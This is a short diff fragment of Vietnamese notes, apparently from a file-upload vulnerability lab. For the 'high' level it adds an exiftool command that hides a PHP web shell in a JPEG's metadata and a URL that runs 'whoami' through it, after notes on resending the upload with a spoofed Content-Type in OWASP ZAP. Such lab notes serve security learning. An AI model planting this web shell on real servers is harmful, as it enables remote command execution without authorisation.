@@ -116,8 +116,8 @@ tương tự nhưng mở OWASP ZAP nên
 resend lại upload nhớ sửa Content-Type: image/jpeg (hoặc file j đc phép)
 
 high
-
-
+exiftool -DocumentName="<?php system($_GET['cmd']); ?>" filename.jpg
+http://<ipaddr>/uploads/test.jpg?cmd=whoami
 
 ```
 
